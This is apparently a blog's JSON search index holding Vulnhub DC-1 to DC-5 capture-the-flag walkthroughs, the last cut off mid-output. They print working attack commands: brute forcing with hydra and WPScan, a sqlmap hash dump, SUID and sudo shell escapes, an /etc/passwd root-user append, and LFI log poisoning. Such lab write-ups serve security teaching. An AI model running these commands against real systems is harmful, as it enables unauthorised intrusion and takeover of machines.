var store = [{
        "title": "Vulnhub DC-1 Walkthrough",
        "excerpt":"This box is relatively straightforward; there are publicly available exploits that make it even easier. To gain an initial foothold, all we need to do is identify the service and its version. Once we have this information, a quick search on Google or in the Searchsploit database provides us with a suitable exploit. The Metasploit framework offers a good exploit in many cases, which I utilized.   For privilege escalation, we need to locate SUID binaries and abuse them. In this instance, there were two such binaries: ‘exim4’ and ‘find.’ The techniques and tactics for this type of privilege escalation are also publicly available.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT      STATE SERVICE VERSION 22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) | ssh-hostkey:  |   1024 c4d659e6774c227a961660678b42488f (DSA) |   2048 1182fe534edc5b327f446482757dd0a0 (RSA) |_  256 3daa985c87afea84b823688db9055fd8 (ECDSA) 80/tcp    open  http    Apache httpd 2.2.22 ((Debian)) |_http-generator: Drupal 7 (http://drupal.org) |_http-title: Welcome to Drupal Site | Drupal Site | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/  | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt  | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt  |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.2.22 (Debian) 111/tcp   open  rpcbind 2-4 (RPC #100000) | rpcinfo:  |   program version    port/proto  service |   100000  2,3,4        111/tcp   rpcbind |   100000  2,3,4        111/udp   rpcbind |   100000  3,4          111/tcp6  rpcbind |   100000  3,4          111/udp6  rpcbind |   100024  1          39675/tcp   status |   100024  1          42139/tcp6  status |   100024  1          47521/udp6  status |_  100024  1          50689/udp   status 39675/tcp open  status  1 (RPC #100024) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   From the Nmap results, various services confirmed that it’s a Debian-based Linux machine. Only a few minimal ports are open, with the most promising one being port 80. Port 22 is also open, but I currently lack the credentials to attempt an SSH attack. Therefore, I will begin my investigation by focusing on the web server running on port 80.   Manual Inspection     This site is built with the Drupal content management system, and our Nmap scan confirmed that it’s running Drupal version 7. Rather than wasting time, I decided to search for publicly available exploits for Drupal 7. Using Searchsploit, I found a Metasploit exploit.      Let’s proceed to Metasploit and check for exploits. While searching in Metasploit, I discovered a SQL injection vulnerability. Let’s start by attempting this one first.      Initial Foothold      This application is vulnerable to a SQL injection vulnerability, which allowed me to gain a remote shell on the machine. I’ve obtained the initial foothold, and now it’s time to proceed with privilege escalation to gain root privileges.   Post Enumeration   After obtaining the initial foothold, I conducted a thorough examination of the file system permissions, looking for misconfiguration, extra privilege files, and possible stored passwords. During this process, I checked for SUID files and identified two potential privilege escalation vectors: ‘find’ and ‘exim4.’ Both of these files have SUID permissions, making it relatively easy to abuse this type of permission for privilege escalation   Command: find / -perm -u=s -type f 2&gt;/dev/null  Response:   /bin/mount /bin/ping /bin/su /bin/ping6 /bin/umount /usr/bin/at /usr/bin/chsh /usr/bin/passwd /usr/bin/newgrp /usr/bin/chfn /usr/bin/gpasswd /usr/bin/procmail /usr/bin/find /usr/sbin/exim4 /usr/lib/pt_chown /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /sbin/mount.nfs   Privilege Escalation   First, I would like to attempt privilege escalation using the ‘find’ command. There is a payload available in GTFOBins for this purpose.   bash-4.2$ find . -exec /bin/bash -p \\; -quit find . -exec /bin/bash -p \\; -quit bash-4.2# id id uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)   It worked, and I’ve achieved root access. It shows that my user is still ‘www-data’, but my EUID is 0 (root), and my groups are 0 (root). This means I have all the permissions of the root user.      #h@ppyh@cking  ","categories": ["DC-Series"],
        "tags": [],
        "url": "/dc-series/vulnhub-dc-1-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub DC-2 Walkthrough",
        "excerpt":"This box provided a valuable learning experience. To gain the initial foothold, I created a custom word list using the ‘cwel’ tools. After generating the word list, I executed WPScan with a password brute-force attack, which resulted in discovering two valid credentials for the web console. However, neither of these accounts had admin privileges, so we couldn’t obtain a shell from there.   Next, we attempted SSH login, and Tom successfully logged into the machine. The default shell for the ‘tom’ user was ‘rbash,’ but we managed to escape from it using the ‘vi’ editor. This allowed us to access ‘flag3.txt,’ which contained a clue for switching to the ‘jerry’ user. We used the passwords obtained from WordPress for ‘jerry,’ and with ‘jerry,’ we ran ‘git’ as root. We successfully abused this to escalate privileges and gain root access.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT     STATE SERVICE VERSION 80/tcp   open  http    Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Did not follow redirect to http://dc-2/ 7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) | ssh-hostkey:  |   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA) |   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA) |   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA) |_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   The Nmap results reveal that only two ports are open: port 80 and port 7744, which are hosting the HTTP and SSH servers, respectively. However, the SSH server is listening on an unusual port, as the developer has changed the default one. Unfortunately, I currently don’t have any credentials to work with SSH, so I’ll focus on the web server for now.   Nmap indicates that it’s redirecting to ‘http://dc-2/’. So, as a first step, let’s add this entry to our hosts file.   echo '192.168.197.135 http://dc-2' | sudo tee -a /etc/hosts   Now we can access the web server through the url.   Manual Inspection      It’s a WordPress application with a navigation bar containing some links, but there doesn’t seem to be any interactive content on the web server. The first idea that came to my mind is to initiate a scan of the application using WPScan. Since there isn’t anything to interact with on the web server, I’d like to start by generating a password word list and then run WPScan for potential password brute-forcing in case I discover any valid usernames. To create the word list, I’ll make use of the built-in tools available in Kali Linux, specifically the ‘cweI’ tool.   Command: cewl -d 3 -w password.txt $URL Response: CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)      Now that we have the word list, we can proceed with running WPScan. Typically, WordPress can reveal usernames if it’s not configured securely. One common approach is to first enumerate the users and then construct the word list for the brute force attack. However, to simplify the process, I decided to take a shortcut and performed this step once.   wpscan --enumerate --passwords password.txt --url $URL  [+] URL: http://dc-2/ [192.168.197.135] [+] Started: Wed Oct 18 03:58:39 2023  Interesting Finding(s):  [+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).  | Found By: Rss Generator (Passive Detection)  |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;  |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;  [+] WordPress theme in use: twentyseventeen  | Location: http://dc-2/wp-content/themes/twentyseventeen/  | Last Updated: 2023-03-29T00:00:00.000Z  | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt  | [!] The version is out of date, the latest version is 3.2  | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10  | Style Name: Twenty Seventeen  [i] User(s) Identified:  [+] admin  | Found By: Rss Generator (Passive Detection)  | Confirmed By:  |  Wp Json Api (Aggressive Detection)  |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)  |  Login Error Messages (Aggressive Detection)  [+] jerry  | Found By: Wp Json Api (Aggressive Detection)  |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1  | Confirmed By:  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)  |  Login Error Messages (Aggressive Detection)  [+] tom  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  | Confirmed By: Login Error Messages (Aggressive Detection) --- snip --- [!] Valid Combinations Found:  | Username: jerry, Password: adipiscing  | Username: tom, Password: parturient   This time, I was fortunate enough to discover three users, including the admin. Additionally, it identified passwords for two of the users, except for the admin.      I have checked both users account none of them are admin. So there is no way to get shell from there. As we have two pair of valid user credentials and we saw earlier ssh server is open lets try to attempt password re-use attack against SSH.   SSH brute-force   hydra -L users.txt -P password.txt ssh://dc-2:7744  [7744][ssh] host: dc-2   login: tom   password: parturient   The tom user use the same password for web application and the ssh login.   Creds    💡 jerry:adipiscing tom:parturient    Initial Foothold   As hydra confirm tom’s password is valid for ssh, we can just login through ssh.      Escaping rbash   The default shell is set for tom user was rbash. Which is a restricted bash environment. We need to escape this bash environment for better control over the system. I found some technique, as the vi is present so i decide to use the vi technique.   vi :set shell=/bin/sh :shell /bin/bash export PATH=/bin/:/usr/bin/:/usr/local/bin:$PATH      Now everything is okay i have a regular shell on the system.   Post Enumeration   After escaping the ‘rbash’ shell, I simply ran the ‘ls’ command and discovered ‘flag3.txt.’ Inside ‘flag3.txt,’ there was a message indicating that Tom should switch over to the ‘jerry’ user. I attempted to switch using the password acquired from WordPress, and it succeeded.      After switch over to jerry i check the sudo permission for the jerry and found jerry can run git with sudo without password.      This is a possible way to elevate our privilege as root. I searched google and found GTFObins exploit.   Privilege Escalation   At this point escalate our privilege is very easy. We just need to run git using sudo and add some extra flags -p help config and that’s it and we are root.   sudo git -p help config !/bin/sh      #h@ppyh@cking  ","categories": ["DC-Series"],
        "tags": [],
        "url": "/dc-series/vulnhub-DC-2-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub DC-3 Walkthrough",
        "excerpt":"This box is really easy, relying entirely on reconnaissance skills. For the initial foothold, we need to identify the CMS and its version. Once the CMS version is identified, there is a known SQL injection vulnerability that leads to obtaining the admin user’s password hash. After decrypting the password, we can log in to the application. A theme allows the execution of PHP code, leading to the initial foothold. The kernel is quite old, and there is a publicly available exploit that grants root access.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT   STATE SERVICE VERSION 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Home |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-generator: Joomla! - Open Source Content Management   From the nmap output we found only one http service is accessible publicly and the banner tells us it’s a ubuntu machine. The application is generated by joomla Open source content management system. Lets inspect the application manually.   Manual Inspection      There isn’t much available. Since it’s a Joomla application, I’d like to run another nmap for vulnerability scanning.   nmap -p80 --script vuln 10.10.10.6  PORT   STATE SERVICE VERSION 80/tcp open  http |_http-dombased-xss: Couldn't find any DOM based XSS. |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. | http-internal-ip-disclosure:  |_  Internal IP Leaked: 127.0.1.1 | http-csrf:  | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.6 |   Found the following possible CSRF vulnerabilities:  |      |     Path: http://10.10.10.6:80/ |     Form id: login-form |     Form action: /index.php |      |     Path: http://10.10.10.6:80/index.php/component/users/?view=reset&amp;amp;Itemid=101 |     Form id: user-registration |     Form action: /index.php/component/users/?task=reset.request&amp;Itemid=101 |      |     Path: http://10.10.10.6:80/index.php/component/users/?view=reset&amp;amp;Itemid=101 |     Form id: login-form |     Form action: /index.php/component/users/?Itemid=101 |      |     Path: http://10.10.10.6:80/index.php/component/users/?view=remind&amp;amp;Itemid=101 |     Form id: user-registration |     Form action: /index.php/component/users/?task=remind.remind&amp;Itemid=101 |      |     Path: http://10.10.10.6:80/index.php/component/users/?view=remind&amp;amp;Itemid=101 |     Form id: login-form |     Form action: /index.php/component/users/?Itemid=101 |      |     Path: http://10.10.10.6:80/index.php/2-uncategorised/1-welcome |     Form id: login-form |     Form action: /index.php |      |     Path: http://10.10.10.6:80/index.php |     Form id: login-form |     Form action: /index.php |      |     Path: http://10.10.10.6:80/index.php/component/users/?Itemid=101 |     Form id: username-lbl |     Form action: /index.php/component/users/?task=user.login&amp;Itemid=101 |      |     Path: http://10.10.10.6:80/index.php/component/users/?Itemid=101 |     Form id: login-form |_    Form action: /index.php/component/users/?Itemid=101 | http-vuln-cve2017-8917:  |   VULNERABLE: |   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability |     State: VULNERABLE |     IDs:  CVE:CVE-2017-8917 |     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers |       to execute aribitrary SQL commands via unspecified vectors. |        |     Disclosure date: 2017-05-17 |     Extra information: |       User: root@localhost |     References: |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917 |_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html | http-slowloris-check:  |   VULNERABLE: |   Slowloris DOS attack |     State: LIKELY VULNERABLE |     IDs:  CVE:CVE-2007-6750 |       Slowloris tries to keep many connections to the target web server open and hold |       them open as long as possible.  It accomplishes this by opening connections to |       the target web server and sending a partial request. By doing so, it starves |       the http server's resources causing Denial Of Service. |        |     Disclosure date: 2009-09-17 |     References: |       http://ha.ckers.org/slowloris/ |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 | http-enum:  |   /administrator/: Possible admin folder |   /administrator/index.php: Possible admin folder |   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0 |   /language/en-GB/en-GB.xml: Joomla version 3.7.0 |   /htaccess.txt: Joomla! |   /README.txt: Interesting, a readme. |   /bin/: Potentially interesting folder |   /cache/: Potentially interesting folder |   /images/: Potentially interesting folder |   /includes/: Potentially interesting folder |   /libraries/: Potentially interesting folder |   /modules/: Potentially interesting folder |   /templates/: Potentially interesting folder |_  /tmp/: Potentially interesting folder   From the second Nmap output, we found the version of Joomla, and it’s vulnerable to SQL injection. Let’s search in searchsploit to see if there is any exploit available for this Joomla version.      Searchsploit also reveals that this Joomla version is vulnerable to SQL injection. Let’s fire up SQLmap to automate the SQLi exploitation process.   sqlmap -u \"http://10.10.10.6/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=update.xml\"-p list[fullordering] -D joomladb -T '#__users' -C id,username,password --dump**  [*] starting @ 02:20:00 /2021-05-29/  [02:20:01] [INFO] resuming back-end DBMS 'mysql'  [02:20:01] [INFO] testing connection to the target URL [02:20:01] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=c58fg7qsgap...985gcqei64'). Do you want to use those [Y/n] y sqlmap resumed the following injection point(s) from stored session: --- Parameter: list[fullordering] (GET)     Type: error-based     Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)     Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(5655,CONCAT(0x2e,0x7171716a71,(SELECT (ELT(5655=5655,1))),0x71627a7a71),1990))      Type: time-based blind     Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)     Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 5736 FROM (SELECT(SLEEP(5)))epcn) --- [02:20:03] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.1 [02:20:03] [INFO] fetching entries of column(s) '`id`, `password`, username' for table '#__users' in database 'joomladb' [02:20:03] [INFO] retrieved: '629' [02:20:03] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' [02:20:03] [INFO] retrieved: 'admin' Database: joomladb Table: #__users [1 entry] +------+--------------------------------------------------------------+----------+ | id   | password                                                     | username | +------+--------------------------------------------------------------+----------+ | 629  | **$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu** | admin    | +------+--------------------------------------------------------------+----------+   Exploiting that SQL injection vulnerability with the help of SQLmap, we have successfully managed to obtain the admin user’s password hash. Now, we can use any hash-cracking tools, but for now, I will utilize the John the Ripper tool.      With the help of John, we successfully decrypted the hash and logged into the web application. I discovered two templates inside the template link.      After some exploration of the application’s admin dashboard, I found that the Beez3 template allows us to execute PHP code.      I edited the Beez3 template, specifically the index.php file, and added some reverse shell code.      After saving the file we can just click on Template Preview button to execute the code.   Creds    💡 admin:snoopy    Initial Foothold      After adding our reverse shell code to the index.php file, before executing the code, I started a netcat listener to catch the reverse shell. The reverse shell code worked fine, and we obtained the initial foothold.   Post Enumeration &amp; Privilege Escalation   After obtaining the shell, I explored the file system for any misconfigurations, extra privilege files, or user permissions. However, I did not find anything interesting. Then, I decided to try kernel exploits. Using ‘lsb_release -a,’ I discovered that this is a very old Ubuntu machine.      Searchsploit already have some kernel exploit available.      I just transfer the exploit into the victim machine and extract the zip file and run the exploit which gives me the root shell.     ","categories": ["DC-Series"],
        "tags": [],
        "url": "/dc-series/Vulnhub-dc-3-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub DC-4 Walkthrough",
        "excerpt":"This box was so easy. There are only two ports open: SSH and the HTTP server. For the initial foothold, we need to attempt a brute force attack on the login form of the web application. After logging into the application, we can intercept the request and modify the commands. The lack of input validation will give us the command injection vulnerability, allowing us to gain the initial foothold into the box. The privilege escalation is also straightforward. We found a stored password list, and there was a valid password for one user, which allowed SSH login. Checking the mail revealed another user’s password who has some super permissions on a file editor. Using these super permissions, we can edit any file, leading to root access.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   nmap -p22,80 -sC -sV 192.168.197.136  PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey:  |   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA) |   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA) |_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519) 80/tcp open  http    nginx 1.15.10 |_http-title: System Tools |_http-server-header: nginx/1.15.10 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   From the Nmap scan, I found only two open ports: SSH and the web server. Since there are no credentials, port 22 is not relevant for now. Let’s start hunting through the web server.   Manual Inspection      There is also nothing except the login form. I tried SQL injection, but it did not work. Default passwords did not work, and username enumeration was not successful. So, I tried a brute-force attack with the default admin username, given that it’s a vulnerable box. If it were a real application, I don’t think this would have worked so far. We may need to create a different username and password list to run a more effective brute-force attack.   hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.197.136 http-post-form '/login.php:username=^USER^&amp;password=^PASS^:S=command'  [DATA] attacking http-post-form://192.168.197.136:80/login.php:username=^USER^&amp;password=^PASS^:S=command [80][http-post-form] host: 192.168.197.136   login: admin   password: happy 1 of 1 target successfully completed, 1 valid password found   I’m lucky enough for now, i got the password for the admin user.      There is nothing only command and logout option. So, i go for command.      There is some functionality to run system commands. I plan to intercept the request and try to modify the default command they send. If I can manage to send my own commands, I will find the command injection vulnerability.      They just send plain text commands here, and the server also accepts the modified commands. The command injection vulnerability is confirmed, and we can send a reverse shell command through this vulnerable parameter to get a reverse shell.   Initial Foothold      Earlier, I verified the command injection. Then I attempted a bash TCP one-line reverse shell, but it didn’t work for me. After searching for different ways to get a shell, I found that netcat is present inside the box. Now, it’s a piece of cake to get the initial foothold.   Privilege Escalation      After getting the shell as www-data, I searched for the real users on this machine and found 4 users, including root. So, I started looking for files inside the users’ directories.      All the users’ home directories were empty except for Jim’s. There is a directory called ‘backup’ and two files, ‘mbox,’ which is not readable as www-data. The ‘test.sh’ file has full access, and it is an SUID file. I can abuse this file since I have write access to it. However, I saw a password file, and I have three valid users, so it’s better to run an SSH brute force attack now.   hydra -L users.txt -P old_password.bak 192.168.197.136 ssh  [STATUS] 120.33 tries/min, 361 tries in 00:03h, 397 to do in 00:04h, 14 active [22][ssh] host: 192.168.197.136   login: jim   password: jibril04   SSH brute force successfully manage jim password. so now we can login through ssh as jim.      Now i’m jim through SSH.      Now I can read the ‘mbox’ file; it’s an email. Let’s visit the mail folder for more information. Here is an email from Charles regarding his password. So, now I have Charles’ password as well.      I can normally change the user as chales and i done it here.      Before doing anything, I want to check Charles’ sudo permissions here. I found he has sudo access with no password in the Teehee editor. So, as we have sudo access with a file editor, we can modify any file we want. The very easy way to get root is to add a user with UID and GID 0.      Here i add raaj user with UID and GI 0 means its root user.   echo \"raaj::0:0:::/bin/bash\" | sudo teehee -a /etc/passwd      Now, just change the user to raaj and we are root because we set the UID and GID for the raaj user as 0. In the Linux file system, the UID and GID 0 are always reserved for the root.  ","categories": ["DC-Series"],
        "tags": [],
        "url": "/dc-series/vulnhub-dc-4-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub DC-5 Walkthrough",
        "excerpt":"This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application’s workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT      STATE SERVICE VERSION 80/tcp    open  http    nginx 1.6.2 |_http-server-header: nginx/1.6.2 |*http-title: Welcome 111/tcp   open  rpcbind 2-4 (RPC #100000) | rpcinfo: |   program version    port/proto  service |   100000  2,3,4        111/tcp   rpcbind |   100000  2,3,4        111/udp   rpcbind |   100000  3,4          111/tcp6  rpcbind |   100000  3,4          111/udp6  rpcbind |   100024  1          33051/tcp   status |   100024  1          42452/tcp6  status |   100024  1          45427/udp   status |*   100024  1          47008/udp6  status 33051/tcp open  status  1 (RPC #100024)   From the Nmap results, we identified three open ports. However, the only port of interest is port 80, where the Nginx server is listening. Let’s delve into the web application.   Manual Inspection      The default homepage has a navbar, but aside from the ‘Contact’ tab, nothing is interesting to me at the moment. Before we dive deeper into the application, I would like to run a wfuzz fuzzing to discover hidden files.   Fuzzing   wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"$URL”  ===================================================================== ID           Response   Lines    Word       Chars       Payload                                                                                                     ===================================================================== 000000001:   200        53 L     525 W      4024 Ch     \"index.php\" 000000043:   200        57 L     752 W      5644 Ch     \"faq.php\" 000000106:   200        71 L     479 W      4281 Ch     \"contact.php 000000482:   200        42 L     66 W       851 Ch      \"thankyou.php\" 000001951:   200        53 L     560 W      4291 Ch     \"about-us.php\" 000016294:   200        51 L     525 W      4099 Ch     \"solutions.php\"   During the fuzzing process, the file that caught our interest is ‘thankyou.php.’ When we fill out all the information in the contact.php form and click the submit button, all the data will be processed inside the thankyou.php file through a GET request.      Let’s inspect this URL more closely to understand and find out if there is any way to get in. After analyzing the URL, I didn’t find any vulnerability with any of the parameters. Since it’s an intentionally vulnerable box, there is a high possibility of having a vulnerability. However, I have not tried parameter finding yet. So, let’s check if there is any hidden parameter for the back-end. For this task, I would like to use WFUZZ tools.   wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 --hh 851 \"$URL”  ===================================================================== ID           Response   Lines    Word       Chars       Payload                                                                                                     ===================================================================== 000002206:   200        42 L     63 W       835 Ch      \"file\"   There is a hidden parameter called file, acting like a light in the darkness. I decided to try viewing the /etc/passwd file, and it worked.      Now that we have LFI, allowing us to read files, we need to confirm the extent of this vulnerability. If we can only read the data, that’s helpful, but if we can also execute files, we might gain control of the system. Let’s first confirm the capability. I’ll attempt to call the index file. If we receive back the raw code, it means we can only read the code. If we see the furnished web application, it indicates code execution as well.      As we can see from the furnished output, it’s confirmed that the LFI also has the capability to execute the code. Now, we need to find a way to gain access to the system using this LFI vulnerability. I would like to check all the files accessible through this LFI vulnerability, so I’ll run wfuzz again.   wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 835 \"$URL”  ===================================================================== ID           Response   Lines    Word       Chars       Payload                                                                                                     =====================================================================                           000000124:   200        58 L     152 W      1546 Ch     \"/etc/apt/sources.list\"                                                                                     000000116:   200        263 L    1162 W     7950 Ch     \"/etc/apache2/apache2.conf\"                                                                                 000000133:   200        96 L     117 W      1558 Ch     \"/etc/group\"                                                                                                000000130:   200        54 L     151 W      1499 Ch     \"/etc/fstab\"                                                                                                000000203:   200        52 L     120 W      1246 Ch     \"/etc/hosts.allow\"                                                                                          000000204:   200        59 L     174 W      1546 Ch     \"/etc/hosts.deny\"                                                               000000126:   200        57 L     187 W      1557 Ch     \"/etc/crontab\"                                                                                              000000200:   200        49 L     85 W       1019 Ch     \"/etc/hosts\"                                     000000252:   200        70 L     104 W      2319 Ch     \"/etc/passwd\"                                       000000245:   200        62 L     124 W      1332 Ch     \"/etc/nsswitch.conf\"                                 000000244:   200        61 L     166 W      1602 Ch     \"/etc/netconfig\"                                                                                            000000241:   200        49 L     103 W      1121 Ch     \"/etc/motd\"                                                                                                 000000243:   200        170 L    590 W      4368 Ch     \"/etc/mysql/my.cnf\"                                                                                         000000232:   200        44 L     68 W       861 Ch      \"/etc/issue\"                                                                                                000000231:   200        466 L    1334 W     11019 Ch    \"/etc/init.d/apache2\"                   000000394:   200        45 L     69 W       898 Ch      \"/etc/resolv.conf\"                                                                                          000000395:   200        82 L     180 W      1722 Ch     \"/etc/rpc\"                                                                                                  000000422:   200        46 L     98 W       1114 Ch     \"/etc/updatedb.conf\"                                                                                        000000417:   200        130 L    376 W      3376 Ch     \"/etc/ssh/sshd_config\"                                                                                      000000492:   200        68 L     230 W      1778 Ch     \"/proc/cpuinfo\"                                                                                             000000500:   200        64 L     402 W      4135 Ch     \"/proc/net/tcp\"                                                                                             000000505:   200        43 L     78 W       972 Ch      \"/proc/version\"                                                                                             000000504:   200        83 L     164 W      1620 Ch     \"/proc/self/status\"                                                                                         000000501:   200        49 L     87 W       1011 Ch     \"/proc/partitions\"                                                                                          000000502:   200        42 L     66 W       908 Ch      \"/proc/self/cmdline\"                                                                                        000000498:   200        46 L     117 W      1281 Ch     \"/proc/net/dev\"                                                                                             000000499:   200        45 L     96 W       1219 Ch     \"/proc/net/route\"                                                                                           000000497:   200        46 L     90 W       1145 Ch     \"/proc/net/arp\"                                                                                             000000494:   200        43 L     68 W       861 Ch      \"/proc/loadavg\"                                                                                             000000496:   200        67 L     213 W      2603 Ch     \"/proc/mounts\"                                                                                              000000495:   200        86 L     191 W      2061 Ch     \"/proc/meminfo\"                                                                                             000000493:   200        104 L    379 W      3735 Ch     \"/proc/interrupts\" 000000693:   200        47 L     69 W       293123 Ch   \"var/log/nginx/access.log\"                                  000000694:   200        42 L     68 W       293123 Ch   \"/var/log/lastlog\"                                                                                          000000736:   200        46 L     88 W       13877 Ch    \"/var/log/wtmp\"                                                                                             000000745:   200        44 L     70 W       1987 Ch     \"/var/run/utmp\"                                                                                               We now have access to all these important files on this machine. One of the most interesting files is var/log/nginx/access.log. This file stores all the requests made to the server, along with the corresponding URLs. At this point, my idea is to attempt log poisoning. If we make a request with PHP code inside the URL, the response will be 404, but the PHP code will be present in the log file. As we observed earlier, the LFI also executes code. Therefore, when we access the file during the execution process, the code will be executed.      We wrote a command injection vulnerable code that will be stored inside the log file. During the opening of the file, we should get command execution. Now, let’s verify the command injection.   curl [http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=ping](http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=ping) 192.168.197.131   We made a curl request with our desired URL. Here, ‘file=/var/log/nginx/access.log’ reads the log file, and ‘cmd=ping 192.168.197.131’ is the command for pinging my local machine, which will verify the command injection. To confirm, we can run a listener on our attack box.   sudo tcpdump -i eth0 -c5 icmp  Response tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes 03:49:14.643611 IP 192.168.197.133 &gt; 192.168.197.131: ICMP echo request, id 1799, seq 9817, length 64 03:49:14.643690 IP 192.168.197.131 &gt; 192.168.197.133: ICMP echo reply, id 1799, seq 9817, length 64 03:49:15.285594 IP 192.168.197.133 &gt; 192.168.197.131: ICMP echo request, id 2258, seq 400, length 64 03:49:15.285628 IP 192.168.197.131 &gt; 192.168.197.133: ICMP echo reply, id 2258, seq 400, length 64 03:49:15.645248 IP 192.168.197.133 &gt; 